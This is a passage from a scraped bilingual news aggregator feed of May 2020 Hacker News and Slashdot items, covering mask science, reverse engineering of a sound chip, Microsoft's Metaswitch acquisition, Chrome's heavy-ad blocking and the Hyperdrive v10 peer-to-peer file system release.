micro-droplets.\n Another recent study showed that unfitted surgical masks were  100% effective in blocking seasonal coronavirus in droplets ejected during breathing.\n If only people with symptoms infected others, then only people with symptoms would need to wear masks. But experts have shown that people without symptoms  pose a risk of infecting others. In fact,  four  recent  studies  show that nearly half of patients are infected by people who do not themselves have symptoms.\n This evidence seems, to me, clear and simple: COVID-19 is spread by droplets. We can see directly that a piece of cloth blocks those droplets and the virus those droplets contain. People without symptoms who don’t even know they are sick are responsible for around half of the transmission of the virus.\n    After going through all of this strong evidence in late March and early April, I wondered why mask-wearing was controversial amongst health organizations in the Western world. The U.S. and European CDCs did not recommend masks, and neither did nearly any western government except for Slovakia and Czechia, which both required masks in late March.\n  The first was that most researchers were looking at the wrong question – how well a mask protects the wearer from infection and not how well a mask prevents an infected person from spreading the virus. Masks function very differently as personal protective equipment (PPE) versus source control.\n Masks are very good at blocking larger droplets and  not nearly as good at blocking tiny particles. When a person expels droplets into the air, they  quickly evaporate and shrink to become tiny airborne particles called droplet nuclei. These are  extremely hard to remove from the air. However, in the moist atmosphere between a person’s mouth and their mask, it takes nearly  a hundred times as long for a droplet to evaporate and shrink into a droplet nuclei.\n This means that nearly any kind of simple cloth mask is great for source control. The mask creates humidity, this humidity prevents virus-containing droplets from turning into droplet nuclei, and this allows the fabric of the mask to block the droplets.\n Unfortunately, nearly all of the research that was available at the start of this pandemic focused on mask efficacy as PPE. This measure is very important for protecting health care workers, but does not capture their value as source control. On Feb. 29, the U.S.  surgeon general tweeted that masks “are NOT effective in preventing general public from catching #Coronavirus.” This missed the key point: They are extremely effective at preventing its spread, as our review of the literature showed.\n The second problem was that most medical researchers are used to judging interventions on the basis of  randomized controlled trials. These are the foundation of evidence based medicine. However, it is impossible and unethical to test mask-wearing, hand-washing or social distancing during a pandemic.\n Experts like Trisha Greenhalgh, the author of the best-selling textbook “How to Read a Paper: The Basics of Evidence Based Healthcare,” are  now asking, “Is Covid-19 evidence-based medicine’s nemesis?” She and others  are suggesting that when a simple experiment finds evidence to support an intervention and that intervention has a limited downside, policymakers should act before a randomized trial is done.\n The third problem is that there is a shortage of medical masks around the world. Many policymakers were concerned that recommending face coverings for the public would lead to people hoarding medical masks. This led to seemingly contradictory guidance where the CDC said there was no reason for the public to wear masks but that masks needed to be saved for medical workers. The CDC has now clarified its stance and  recommends the public use of homemade masks while saving higher-grade masks for medical professionals.\n   There are  numerous  studies that suggest if 80% of people wear a mask in public, then COVID-19 transmission could be halted. Until a vaccine or a cure for COVID-19 is discovered, cloth face masks might be the most important tool we currently have to fight the pandemic.\n Given all of the laboratory and epidemiological evidence, the low cost of wearing masks – which can be made at home with no tools – and the potential to slow COVID-19 transmission with widescale use, policymakers should ensure that everyone wears a mask in public.\n [ You need to understand the coronavirus pandemic, and we can help.  Read The Conversation’s newsletter.]", "posttime": "2020-05-15 01:37:59", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "州长,urging,口罩", "title": "我是敦促州长们要求公众戴口罩的100名专家之一", "title_en": "I'm one of 100 experts urging governors to require public mask-wearing", "transed": 1, "url": "https://theconversation.com/masks-help-stop-the-spread-of-coronavirus-the-science-is-simple-and-im-one-of-100-experts-urging-governors-to-require-public-mask-wearing-138507", "via": "", "real_tags": ["州长", "urging", "口罩"]}, {"category": "", "categoryclass": "", "imagename": "f714f4a9c5f4f6f8b26864e2b8180931.jpg", "infoid": 1002116, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "还记得古老的视频游戏“太空入侵者”吗？它的一些音效是由一种名为76477复杂声音生成芯片的芯片提供的。虽然这款1978年芯片产生的音效今天看起来很原始，但它被用于许多视频游戏，弹球游戏。但是这个芯片里有什么？它是如何内部工作的？通过根据芯片的照片对芯片进行逆向工程，我们可以找到答案。(肖恩·里德尔提供的照片)在这篇文章中，我将解释这个芯片的模拟电路是如何工作的，并展示硅晶片上的数百个晶体管是如何形成这个复杂芯片的电路的。", "note_en": "Remember the old video game Space Invaders?Some of its sound effects were provided by a chip called the  76477 Complex Sound Generation chip.While the  sound effects  1 produced by this 1978 chip seem primitive today, it was used in many  video games,  pinball  games.But what&#39;s inside this chip and how does it work internally?By reverse-engineering the chip from  die photos, we can find out. (Photos courtesy of  Sean Riddle.)In this article, I explain how the analog circuits of this chip works and show how the hundreds of transistors on the silicon die form the circuits of this complex chip.", "posttime": "2020-05-15 01:09:22", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "太空,逆向工程,芯片,照片,invaders", "title": "从模具照片逆向工程76477个“太空入侵者”声音芯片(2017年)", "title_en": "Reverse engineering the 76477 “Space Invaders” sound chip from die photos (2017)", "transed": 1, "url": "http://www.righto.com/2017/04/reverse-engineering-76477-space.html?m=1", "via": "", "real_tags": ["太空", "逆向工程", "芯片", "照片", "invaders"]}, {"category": "", "categoryclass": "", "imagename": "1e87b101de7983dabe12b6d639f9d55f.jpg", "infoid": 1002115, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "不到一个月前，微软刚刚完成了对另一家专注于电信市场的公司Affirmed Networks的收购。\n微软周四表示，已同意收购Metaswitch Networks，这是一家拥有软件的公司，电信公司可以使用该软件向客户提供语音和数据服务。交易条款并未披露。\n此举表明，微软正努力通过无机交易瞄准单一行业，而不是在内部建立专业知识和技术。这些努力可能会帮助微软进一步采用其Azure公共云，这将挑战市场领先者亚马逊网络服务(Amazon Web Services)。\n微软公司副总裁优素福·哈利迪(Yousef Khalidi)在一篇博客文章中写道：云和通信网络的融合为微软提供了一个独特的机会，通过对Azure的持续投资为全球运营商提供服务，通过运行虚拟化通信功能、应用程序和网络所需的专业软件，为我们的超大规模云基础设施增添更多深度。\nMetaswitch有一款5G产品，用于处理可以在公共云基础设施上运行的网络流量。客户可以依赖该公司的软件建立在云基础设施之上，而不是在自己的数据中心增加容量，以支持更高速度的额外网络使用。\n微软在完成对以移动运营商为目标的初创企业Affirmed Networks的收购三周后宣布了这笔交易。去年，微软自己宣布了与美国电话电报公司(AT&amp；T；)的一项多年云协议。\nMetaswitch网站上列出的客户包括英国电信(British Telecom)、Sprint(现在归T-Mobile所有)、瑞士电信(Swisscom)、澳洲电信(Telstra)和沃达丰(Vodafone)。\n根据LinkedIn的数据，Metaswitch拥有近700名员工。该公司成立于1981年，总部设在伦敦和加利福尼亚州的洛斯阿尔托斯。投资者包括红杉资本(Sequoia Capital)。", "note_en": "The announcement comes less than a month after Microsoft closed the acquisition of another company focused on the telecommunications market, Affirmed Networks.\n Microsoft said Thursday it has agreed to acquire Metaswitch Networks, a company with software that telecommunications companies can use to deliver voice and data services to their customers. Terms of the deal weren&#39;t disclosed.\n The move shows Microsoft&#39;s efforts to target a single industry through inorganic deals rather than building expertise and technology in house. These efforts could help Microsoft gain further adoption of its Azure public cloud, which challenges market leader  Amazon Web Services.\n  &#34;The convergence of cloud and communication networks presents a unique opportunity for Microsoft to serve operators globally via continued investment in Azure, adding additional depth to our hyperscale cloud infrastructure with the specialized software required to run virtualized communication functions, applications and networks,&#34; Yousef Khalidi, a Microsoft corporate vice president, wrote in a  blog post.\n Metaswitch has a 5G product for handling network traffic that can run on public cloud infrastructure. Customers could rely on the company&#39;s software atop cloud infrastructure rather than adding capacity in their own data centers to support additional network use at higher speeds.\n Microsoft announced the deal three weeks after the close of its acquisition of  Affirmed Networks, a start-up targeting mobile carriers. Last year Microsoft itself announced a  multi-year cloud deal with  AT&amp;T.\n Customers listed on the Metaswitch website include British Telecom, Sprint (which is now owned by  T-Mobile), Swisscom, Telstra and  Vodafone.\n Metaswitch has nearly 700 employees, according to LinkedIn. The company was founded in 1981 and has headquarters in London and Los Altos, California. Investors include  Sequoia Capital.", "posttime": "2020-05-15 01:08:51", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "微软,microsoft,电信,acquires", "title": "微软在电信推广中收购Metaswitch", "title_en": "Microsoft acquires Metaswitch in telecom push", "transed": 1, "url": "https://www.cnbc.com/2020/05/14/microsoft-acquires-metaswitch-in-telecom-push.html", "via": "", "real_tags": ["微软", "microsoft", "电信", "acquires"]}, {"category": "", "categoryclass": "", "imagename": "39af4835765b85b493b80ab52e5bcf34.jpeg", "infoid": 1002114, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Zach Vorhies向右翼组织Project Veritas泄露了文件，然后成为QAnon坚定的反Vaxxer和推动者。在4月份的一段视频中，他阐述了宣传“Plandemic”的计划。", "note_en": "Zach Vorhies leaked documents to the right-wing group Project Veritas, then became a committed anti-vaxxer and promoter of QAnon. In an April video, he laid out his plan to promote 'Plandemic.'", "posttime": "2020-05-15 01:08:32", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "谷歌,google,歌人,turned,vaxxer", "title": "前谷歌人成为举报人，QAnon Fan让“Plandemic”走红", "title_en": "Ex-Googler Turned Whistleblower and QAnon Fan Made 'Plandemic' Go Viral", "transed": 1, "url": "https://www.vice.com/en_us/article/k7qqyn/an-ex-google-employee-turned-whistleblower-and-qanon-fan-made-plandemic-go-viral", "via": "", "real_tags": ["谷歌", "google", "歌人", "turned", "vaxxer"]}, {"category": "", "categoryclass": "", "imagename": "7f2ded749dd4efa38b0ce70a9c5ea7a0.png", "infoid": 1002113, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "谷歌今天宣布，Chrome将开始屏蔽资源密集型广告。例如挖掘加密货币的广告、编程不佳的广告或未针对网络使用进行优化的广告。Chrome将屏蔽这些广告，因为它们“耗尽了电池寿命，使本已紧张的网络饱和，而且还会花钱。”有三种可能的阈值可以阻止广告：4MB网络数据、任意30秒周期内15秒的CPU使用率或60秒的总CPU使用率。谷歌将在“接下来的几个月内”试验这一变化，并将“在8月底”在Chrome稳定版上推出它。\n没有多少人意识到世界上最受欢迎的浏览器有内置的广告拦截程序。两年前，谷歌加入了更好广告联盟(Coalition For Better Adds)，这是一个专门为行业如何改善消费者广告制定标准的组织。Chrome屏蔽了联盟定义的显示不合规广告的网站上的所有广告(包括谷歌拥有或提供的广告)。除了广告，谷歌还使用Chrome的广告拦截程序来解决“滥用体验”的问题。因此，该工具更多的是用来惩罚不良网站，而不是完全的广告拦截程序。\n因为广告拦截器损害了创造免费内容的出版商(如VentureBeat)，屏蔽所有广告不仅会削弱网络为数不多的盈利工具之一，而且还会削弱Alphabet的主要收入来源。事实上，改善网络用户体验符合谷歌的既得利益。因此，谷歌的方法是从小规模做起，慢慢升级--逐渐改变企业主、营销者和开发者建立网站的方式。考虑到它的覆盖范围，包括超过10亿Chrome用户和超过25亿台每月活跃的Android设备，更不用说谷歌搜索和谷歌广告了，任何拥有网站的人都需要跟踪谷歌优先考虑的事情。\n谷歌表示，“不到百分之一的广告”消耗了不成比例的设备资源，包括电池和网络数据。该公司测量了Chrome看到的广告，并锁定了最恶劣的广告，即那些“使用的CPU或网络带宽超过该资源所有检测到的广告的99.9%”的广告。\nVB Transform 2020 Online-7月15日至17日：与领先的AI高管一起参加年度AI活动。立即注册，可节省30%的数字访问通行证。\n谷歌表示，这些门槛(4MB网络数据，任何30秒内15秒的CPU使用量，60秒的总CPU使用量)仅占广告的0.3%。然而，它们占广告使用的网络数据的26%，占所有广告CPU使用量的28%。谷歌下面的图表显示了重型广告和非重型广告的总体百分比，以及每种广告的总资源使用量。\n在用户与广告互动之前，Chrome会限制显示广告可以使用的资源。当广告达到某个阈值时，该广告的框架将导航到一个错误页面，该页面简单地显示“广告已删除”。\n点击详细信息将通知用户该广告使用了太多资源。\n谷歌想要四处施压，以减少这些数字。据推测，它随后将调整门槛。目标是什么？“节省我们用户的电池和数据套餐，并为他们提供良好的网络体验。”\n但谷歌不想简单地打开这种大量广告干预的开关。该公司希望让广告创建者和工具提供商有时间“准备好这些门槛，并将其纳入他们的工作流程”。谷歌还将与广告商分享报告，这样他们就可以看到Chrome的广告拦截程序是如何影响他们的广告的。", "note_en": "Google today announced that Chrome will start blocking resource-heavy ads. Examples include ads that mine cryptocurrency, are poorly programmed, or are unoptimized for network usage. Chrome will block these ads because they “drain battery life, saturate already strained networks, and cost money.” There are three possible thresholds an ad can hit to be blocked: 4MB of network data, 15 seconds of CPU usage in any 30 second period, or 60 seconds of total CPU usage. Google will be experimenting with this change “over the next several months” and will roll it out on Chrome stable “near the end of August.”\n Not many are aware that the world’s most popular browser  has a built-in ad blocker. Two years ago, Google joined the  Coalition for Better Ads, a group that specifies  standards for how the industry should improve ads for consumers. Chrome  blocks  all ads (including those owned or served by Google) on websites that display non-compliant ads, as defined by the coalition. In addition to ads, Google has also used Chrome’s ad blocker  to tackle “abusive experiences”. The tool is thus more for punishing bad sites than a complete ad blocker.\n  Because ad blockers hurt publishers (like VentureBeat) that create free content, blocking all ads would cripple not only one of the web’s few monetization tools, but  Alphabet’s main revenue stream as well. Indeed, Google has a vested interest in  improving the web’s user experience. Google’s approach is thus to start small and ramp up slowly — gradually changing how business owners, marketers, and developers build websites. Given its reach, including  over 1 billion Chrome users and  over 2.5 billion monthly active Android devices, not to mention  Google Search and  Google Ads, anyone with a website needs to track what Google prioritizes.\n  Google says that “a fraction of a percent of ads” consume a disproportionate share of device resources, including battery and network data. The company measured the ads Chrome sees and targeted the most egregious ads, meaning those that “use more CPU or network bandwidth than 99.9% of all detected ads for that resource.”\n  VB Transform 2020 Online - July 15-17: Join leading AI executives at the AI event of the year.  Register today and save 30% off digital access passes.\n The thresholds (4MB of network data, 15 seconds of CPU usage in any 30 second period, 60 seconds of total CPU usage) represent just 0.3% of ads, Google said. And yet, they account for 26% of network data used by ads and 28% of all ad CPU usage. Google’s chart below shows the overall percentage of heavy and non-heavy ads and the total resource usage of each.\n  Chrome will limit the resources a display ad can use before the user interacts with the ad. When an ad reaches one of the thresholds, the ad’s frame will navigate to an error page that simply says “Ad removed.”\n  Clicking on Details will inform the user that the ad has used too many resources.\n  Google wants to throw its weight around to cut down those numbers. Presumably it will then adjust the thresholds. The goal? “To save our users’ batteries and data plans, and provide them with a good experience on the web.”\n But Google does not want to simply flip a switch on this  heavy ads intervention. The company is looking to give ad creators and tool providers time to “prepare and incorporate these thresholds into their workflows.” Google will also share reports with advertisers so they can see how Chrome’s ad blocker is impacting their ads.", "posttime": "2020-05-15 00:54:24", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "chrom,广告,资源,start", "title": "Chrome将于8月开始屏蔽资源密集型广告", "title_en": "Chrome Will Start Blocking Resource-Heavy Ads in August", "transed": 1, "url": "https://venturebeat.com/2020/05/14/chrome-will-start-blocking-resource-heavy-ads-in-august/", "via": "", "real_tags": ["chrom", "广告", "资源", "start"]}, {"category": "", "categoryclass": "", "imagename": "89c0be1328e21cceadbd7dbd122dff4d.jpg", "infoid": 1002112, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在过去的几年里，我已经(出于兴趣和需要的结合)转变为一名全栈开发人员。在这段时间里，我的前端功夫确实提高了很多。然而，我知道我不会因为对CSS技巧的创新贡献而获得任何奖项。我认为我甚至不会像现在从事后端更改那样感到舒服。\n由于这种偏见，在实现完整堆栈更改时，我总是从后端开始。我将构建一个服务层，创建一个数据库模式，编写一系列测试，并最终围绕我的数据结构构建API。从我最强的那部分开始，以后再弄清楚其余的部分，感觉很好。\n这一切都是倒退的，这会导致心痛。你甚至可以说这是从后到前(停顿以换取掌声)。\n我经常以不太正确的API端点结束，这导致了在客户端聚合一些资源的诱惑。我不是视图层中聚合逻辑的狂热粉丝，所以我通常会在API达到黄金时间之前提交后续合并请求来更改API。这是浪费时间，对我和评论者来说都是相当令人沮丧的。\n最近我在做一些有点不同的事情。我从前到后一直在工作。我一直在使用模拟数据在UI上预先创建我希望看到的用户体验。我通过将数据硬编码在客户端存储中用于单页面应用程序，或通过在控制器中硬编码模型用于多页应用程序来实现这一点。通过这种方式，我可以在投入太多时间之前尝试一些大小的东西，并从团队那里获得反馈。我甚至可以将其部署在功能切换之后，让一些alpha用户在开发周期的早期给出反馈。\n我现在对我在整个工作中试图实现的目标有了一个更明确的想法。起初，我认为我的基于REST的API方法会转变为RPC over HTTP。我担心它会将UI功能与API紧密耦合，但事实并非如此。我的端点稍微重一些，但它们的结构要合理得多。\n有趣的是，我意识到我现在对整个堆栈都很满意，以这种方式实现功能丰富/数据少的更改要快得多。我最近一直在使用StimulusJS(我在这里谈到了它)，并一直将HTML表单视为我的应用程序的基本构建块。也许Visual Basic的以表单为中心的方法终究是针对某件事的呢？\n我猜想，我之前从后端构建更改的倾向更多地是出于安全考虑，而不是任何明确的决定。我很想知道其他后端开发人员在过渡时是否会经历这个过程。前端开发人员最终会发生相反的事情吗？", "note_en": "I’ve transitioned over the last few years (through a combination of interest and necessity) to being a full-stack developer. In this time my front-end-fu has definitely improved a great deal. Yet, I  know that I’m not going to win any awards for innovative contributions to  CSS Tricks. I do not think I will even be as comfortable as I am working on back-end changes.\n As a result of this bias, when implementing full stack changes I’ve always started with the back-end. I’ll build out a service layer, create a database schema, write a bunch of tests, and  eventually build the API around the structure of my data. It felt nice to start in the part of the stack in which I’m strongest and to figure out the rest later.\n This is all backwards and it leads to heartache. You might even say that it’s  back-to-front ( pause for applause).\n I’ve often ended up with API endpoints that are not  quite right, which has led to the temptation to aggregate some resources on the client side. I’m not a huge fan of aggregation logic in the view layer, so I have generally submitted follow-up merge requests to alter the API before it hit prime time. This churn wastes time, and is pretty frustrating for both me and the reviewer.\n I’ve been doing something a little different recently. I’ve been working  front-to-back. I’ve been creating the user experience I’d like to see on the UI up-front with mocked data. I do this by hard-coding data in a client-side store for a single-page app, or by hard-coding models in the controller for a multi-page app. In this way, I can try some things on for size and get feedback from the team before I’ve invested too much time. I can even deploy it behind a feature toggle and let some alpha users give feedback very early in the dev cycle.\n I now have a much more well-defined idea of what I’m trying to achieve throughout the work. At first, I thought that my REST-ish approach to the API would devolve into RPC over HTTP. I worried that it would tightly couple UI features to the API, but this hasn’t been the case. My endpoints are a  little heavier, but they’re structured in a much more sensible way.\n It’s interesting to realize that I’m now comfortable enough across the stack that feature-rich/data-light changes are implemented  much faster in this way. I’ve recently been using StimulusJS (I’ve talked about it  here) and have been treating HTML forms as the basic building block of my application. Maybe Visual Basic’s form-centric approach was onto something after all?\n I would guess that my prior inclination to build changes from the back-end up came more from seeking safety than any explicit decision. I’m curious to find out whether other back end developers go through this process when transitioning. Do front-end devs end up having the opposite thing happen?", "posttime": "2020-05-15 00:53:36", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "软件,构建,software,更改", "title": "从前到后构建软件", "title_en": "Build Software from Front-to-Back", "transed": 1, "url": "https://happyvalley.dev/build-software-from-front-to-back/", "via": "", "real_tags": ["软件", "构建", "software", "更改"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002111, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在过去的一年里，我们一直在努力开发HyperDrive的V10版本。经过长时间的测试版测试，我们很兴奋地宣布，它已经可以普遍使用了！\nHyperDrive是一种点对点文件系统，旨在帮助您直接从计算机快速、安全地共享文件。多年来，HyperDrive v9和其他许多以HYPER为前缀的模块一直是Dat的主干--如果您深入研究了Dat的内部结构，您可能已经熟悉了HyperDrive。\n在这次发布之前，我们做了一些重组：HyperDrive和它的许多超级兄弟现在生活在一个名为Hypercore Protocol的小型、专注于技术的品牌/组织之下。实际上，这一改变除了品牌之外意义不大，但我们希望它能让模块有机会独树一帜。有鉴于此，下面让我们来看看超空间引擎的内部情况。\n在这篇文章中，我们将逐步介绍我们在V10中所做的一些改进，解释HyperDrive如何适应更广泛的Hypercore协议生态系统，并向您展示如何开始使用它。此版本只是个开始，我们将在展望部分介绍我们的下一步工作。\n改进的索引：我们正在使用一种新的基于HAMT的索引结构，称为Hypertrie，它提供了巨大的性能/可伸缩性提升。\n超级驱动器守护程序：我们已经创建了一个跨平台的守护程序，提供对守护程序管理的驱动器的FUSE和GRPC访问。\n更好的基础：我们最近引入了超暖分布式哈希表，以及对超核协议的改进，这有助于使我们的整个堆栈更快、更可靠。\nHyperDrive是用Node.js编写的、与POSIX兼容的文件系统实现，旨在成为快速、可扩展和安全的对等应用程序的存储层。对于大多数开发人员来说，使用Hyperdrive的感觉应该就像使用Node的标准fs模块一样，只需稍加改动。我们的主要目标一直是使使用单个32字节密钥(即hyper：//ab13d.)与他人共享整个文件系统成为可能。从现在开始，我们将Hyperdrive文件系统称为驱动器。\n驱动器非常适合单个编写器想要向多个读取器分发大型可变文件集合的应用程序。文件集合可以是视频库、个人博客、科学数据集或您拥有的任何东西。与BitTorrent类似，对等点可以从其他对等点下载文件，而不会牺牲信任(驱动器内容由原始作者签名)。\n与BitTorrent不同，可以在创建驱动器后添加或修改文件，同行可以监视驱动器进行更新，这意味着更新通知会实时发送给读者！\n重要的是，驱动器支持高效的随机访问文件读取，这意味着您可以在视频中进行搜索，并且它只会按需下载您正在重新查看的视频部分。我们称这种属性为稀疏下载，对于大型网站(假设所有维基百科都镜像到一个驱动器)等读者一次只能浏览一个页面的情况来说，它非常有用。\n在幕后，HyperDrive是使用两个称为Hypercores的仅附加日志数据结构构建的，一个用于高效的元数据索引，另一个用于二进制文件内容。您可以从Hypercore协议网站了解有关Hypercore的更多信息。Hypercore为交换有序数据块提供了快速而安全的基础，但是一个好的文件系统依赖于一个好的索引。\n为了支持执行的文件系统操作，如目录遍历，我们在Hypercore之上分层了一个称为Hypertrie的索引数据结构，它是散列数组映射trie的仅附加实现。描述Hypertrie的全貌本身就是一篇博客文章，但最重要的是，它允许我们使用O(log_4(N))网络请求(最坏情况下)来定位文件/目录元数据，这些元数据可能分散在许多对等点上。在实践中，我们使用专门的Hypercore扩展来显著提高速度(大多数情况下为O(1))。\nHypercore协议生态系统最近有了重大改进，HyperDrive直接受益于所有这些改进。最重要的是，HyperDrive V10利用Hypertrie实现更好的索引，利用Hypersarm实现更好的联网。\n超级暖和是一个卡德姆利亚支持的分布式哈希表实现，是专门为家庭设计的。它使用分布式方法来保持转发--分布式哈希表中的对等点可以帮助引导连接到其他对等点--允许我们遍历绝大多数家庭路由器。\n超群还提供了大量的启发式算法，旨在绕过离线节点并保持路由表的健康。当与HolepPunking相结合时，启发式方法使发现和连接到同级的速度大大加快。\nHyperDrive v9使用的索引数据结构适用于小型驱动器，但随着驱动器或目录变大，该结构很快就崩溃了。在V10中，我们使用的是Hypertrie。它具有很好的伸缩性--作为演示，我们将一个完整的维基百科镜像(数千万个文件，分散在几个目录中)放入一个驱动器中，读取速度保持非常快。\n我们将在后续的帖子中对Hypertrie进行扩展，但目前主要的结论是，您的目录可以像您(现实地)喜欢的那样大，并且文件查找将保持快速！\n在此版本中，我们将重点放在提高可用性、简化驱动器管理和减少共享摩擦的功能上。我们想要介绍的两个最大的东西是挂载，它允许您创建嵌套的超级驱动器，以及超级驱动器守护程序，用作管理驱动器集合的一站式商店。\nHypercore为HyperDrive提供了许多很好的功能，比如稀疏下载，而且免费--大部分工作都是在这一层处理的。然而，Hypercore从根本上说是一种单编写器数据结构。核心的写入器维护一个私钥，该私钥用于签署所有附加的数据，使读者可以在他们之间交换数据，而不必担心被篡改。只允许一个人(在一台机器上！)。不过，对驱动器进行更改是一个很大的限制。不出所料，对多个编写器的支持长期以来一直是我们最需要的功能之一。\n在V10中，我们不会一直走到通用的多编写器解决方案；可伸缩地解决多编写器，而不会招致重大的性能损失或混淆UX，仍然是我们的研究问题。这就是说，V10引入了挂载，这些挂载几乎链接到外观和行为都与普通目录相似的其他超驱动器。\n挂载为更细粒度的共享和有趣的多用户应用程序提供了很多机会。在共享方面，您可以创建一个projects/目录，其中包含诸如projects/my-module、projects/my-WebSite之类的挂载--您正在处理的每件事情都有一个驱动器。有了mount，您可以自己共享my-WebSite，而不会放弃对project/中的所有内容的访问。此模式在守护进程中特别方便，我们将在下面讨论该守护进程。\n当你要安装的驱动器不是你自己的时候，事情会变得更有趣。我们在组模式方面取得了很大成功，在这种模式下，组所有者首先创建顶级组驱动器，然后在组中装载用户配置文件：\n/my-group//由组所有者(例如用户A)拥有/user-a//由用户A拥有/user-b//由用户B拥有.\n使用这种模式，您可以编写简单的群件，在组驱动器上使用递归的readdir来聚合用户间的内容。(#34；Groupware&#34；)。例如，要查找组中的所有博客帖子，您可以在每个用户的博客/目录中搜索所有Markdown文件。\n如果您直接使用HyperDrive，则可以使用drive.mount(path，key，[opts])方法。它的工作方式与您从args中期望的一样(挂载密钥位于path)，并且选项可以包括静态驱动器版本。\n通过CLI在守护进程中创建装载也很容易，下面我们将介绍这一点。\nHyperDrive在构建时考虑到了模块化存储和联网--您可以随心所欲地存储驱动器内容，并且可以通过任何Node.js流复制它们。这种灵活性有好处，但它使开始工作变得更加困难。为此，我们创建了一个跨平台的后台服务(守护程序)，它为您处理存储/网络，同时为您提供访问守护程序管理的驱动器的多种方式。\n守护程序是一项长期运行的服务，因此它可以使您的驱动器保持在线并可供读者使用。它对分布式哈希表的健康也很有好处：因为您的计算机上的节点是稳定的，所以分布式哈希表的路由表中包含的离线节点较少。这转化为更快的密钥查找，这意味着更快的加载时间。\n最重要的是，该守护进程充当向外部服务公开驱动器的中心点--目前我们支持GRPC API，以及相应的Node.js客户端库和FUSE接口。\nFUSE允许我们从Node.js代码中模拟本地文件系统目录。它可以让我们将超级驱动器变成您计算机上的普通目录！这意味着每当守护进程运行时，您都可以直接从OSX Finder中访问驱动器，比如说，作为~/Hyperdrive中的虚拟目录。\n有了FUSE，其他程序可以立即访问驱动器。您可以使用VLC观看电影，使用您最喜欢的阅读器程序加载PDF，并使用诸如find和ls之类的Unix实用程序来浏览驱动器。我们将在下面的入门部分进行更深入的介绍。\nHyperDrive CLI工具包含一些命令，用于与FUSE交互以及显示有关驱动器的信息。它还为那些不想摆弄~/Hyperdrive的用户提供导入和导出命令。\n虽然添加~/Hyperdrive目录是为了简化最终用户UX，但GRPC API是为开发人员提供的--您现在可以用任何语言使用Hyperdrive编程，而不需要处理棘手的联网API。如果您正在使用Node.js，客户端库将为您提供一个感觉与普通驱动器完全相同的RemoteHyperdrive界面。要开始，请跳到这里。\n我们希望守护程序能为希望共享数据的终端用户和想要使用HyperDrive构建应用程序和服务的开发人员提供一个无摩擦的入口点。如果您对用户体验有什么想法或反馈，请不要犹豫加入我们的聊天！\n跳入Hyperdrive堆栈的最佳方式是安装守护程序。这可以通过NPM实现：\n一旦安装了后台进程，您就可以访问HyperDrive CLI命令。从这里开始，您有几个选择。有关更详细的指南，最好参考守护程序的自述文件，但我们将在此重点介绍关键步骤。\n注意：FUSE目前仅在Linux和OSX上可用。CLI的导入和导出命令可用于在Windows上将数据移入/移出驱动器。\n安装之后，您需要立即执行一次性设置步骤，这将请求sudo访问--不用担心，守护进程本身并不是以root用户身份运行的。这是配置捆绑的熔丝内核模块所必需的：\n之后，正常启动守护进程，您会注意到~/Hyperdrive目录存在，并且包含一个名为Network的子目录。如果你看到“网络”，你就可以开始了。\n正如守护程序自述文件中的演练中所述，~/Hyperdrive是您的&#34；根驱动器，您可以将其视为Home目录的替代品。您可以根据需要在其中创建子目录，如文档、视频或项目。\n~/Hyperdrive/Network是一个神奇的目录，因为它实际上并不存在于您的根驱动器中。它的存在是为了让您可以轻松地执行以下操作：\n有关网络的详细信息，以及您可以用来填充和浏览根驱动器的所有CLI命令的说明，可以在自述文件中找到。\n如果您正在运行守护程序实例，则可以使用hydrive-daemon-client模块创建RemoteHyperdrive对象。在幕后，它们将通过GRPC向守护程序管理的驱动器发送命令。\nRemoteHyperdrive API镜像Hyperdrive。以下代码片断将创建一个客户端实例，使用该客户端创建一个新驱动器，然后将文件写入该驱动器：\nconst{HyperdriveClient}=Required(&#39；Hyperdrive-daemon-client&#39；)//自动连接到守护进程const client=new()等待客户端。Ready()//创建新驱动器并写入文件const drive=await client.drive。get()等待驾驶。writeFile(&#39；foo.txt&#39；，&#39；bar&#39；)。\n守护进程的自述文件提供了更多示例。到今天为止，我们只有一个Node.js客户端，但是守护进程的GRPC架构是可用的，我们欢迎任何用其他语言创建客户端的努力。\n烧杯浏览器在内部大量使用HyperDrive。今天也将发布的Baker 1.0 